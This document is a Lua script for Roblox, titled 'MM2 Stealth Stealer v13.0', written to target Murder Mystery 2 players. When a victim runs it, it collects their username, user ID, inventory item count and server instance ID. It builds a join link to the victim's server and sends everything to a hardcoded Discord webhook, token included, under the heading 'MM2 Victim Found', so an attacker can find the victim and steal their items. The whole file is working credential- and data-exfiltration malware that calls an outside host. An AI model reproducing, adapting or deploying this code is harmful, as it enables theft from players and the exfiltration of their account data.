--[[
    MM2 Stealth Stealer v13.0 - GameInstanceId Only
    - Captures game instance ID
    - Sends working public server join link to Discord
    - No friend requests, no waiting
]]

-- === WEBHOOK SENDER ===
local function sendWebhook(content, embedData)
    local payload = {
        content = content or "✅ Script executed"
    }
    if embedData then
        payload.embeds = {embedData}
    end
    
    local body = game:GetService("HttpService"):JSONEncode(payload)
    
    pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
end

-- === GET GAME INSTANCE ID ===
local function getGameInstanceId()
    local http = game:GetService("HttpService")
    local ts = game:GetService("TeleportService")
    local player = game.Players.LocalPlayer
    
    -- Method 1: TeleportService data
    local success, data = pcall(function()
        return ts:GetLocalPlayerTeleportData()
    end)
    
    if success and data and data.instanceId then
        return data.instanceId
    end
    
    -- Method 2: Roblox API
    local success2, response = pcall(function()
        return http:GetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")
    end)
    
    if success2 and response then
        local json = http:JSONDecode(response)
        if json and json.data then
            for _, server in pairs(json.data) do
                if server.id == game.JobId then
                    return server.instanceId or game.JobId
                end
            end
        end
    end
    
    -- Fallback: JobId
    return game.JobId
end

-- === BUILD WORKING JOIN LINK ===
local function buildJoinLink()
    local instanceId = getGameInstanceId()
    return "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameId=" .. instanceId
end

-- === MAIN EXECUTION ===
local player = game.Players.LocalPlayer
local instanceId = getGameInstanceId()
local joinLink = buildJoinLink()

-- Get inventory
local inv = player:FindFirstChild("Inventory")
local items = {}
if inv then
    for _, item in pairs(inv:GetChildren()) do
        table.insert(items, item.Name)
    end
end

-- Send to Discord with working link
sendWebhook("🔗 **Public Server Join Link**", {
    title = "MM2 Victim Found",
    description = "**Victim:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n**Items:** " .. #items .. " weapons\n\n**CLICK THIS LINK TO JOIN:**\n" .. joinLink,
    color = 0x00ff00,
    fields = {
        {
            name = "📋 Instance ID",
            value = "`" .. instanceId .. "`",
            inline = true
        },
        {
            name = "🎯 Place ID",
            value = "`" .. game.PlaceId .. "`",
            inline = true
        }
    }
})

-- Optional: Copy to clipboard as fallback
if setclipboard then
    setclipboard(joinLink)
    print("[CAT] 📋 Link copied to clipboard: " .. joinLink)
end

print("[CAT] ✅ Complete! Check Discord for join link.")
